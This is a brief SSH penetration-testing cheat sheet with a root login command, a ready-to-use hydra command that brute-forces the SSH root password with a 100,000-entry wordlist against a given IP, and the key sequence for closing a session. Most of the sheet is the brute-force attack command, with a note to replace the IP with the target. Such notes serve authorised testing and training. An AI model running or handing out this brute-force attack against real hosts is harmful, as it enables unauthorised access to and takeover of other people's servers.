## SSH Penetration Testing

### Login to SSH
`ssh root@10.11.1.140`

### Brute forcing SSH
```
# Brute force SSH, replace 10.11.1.140 with target ip
hydra -e nsr -l root -P /root/Desktop/wordlists/10_million_password_list_top_100000.txt 10.11.1.140 ssh -t 4
```

### Close SSH connection
```
~.
```
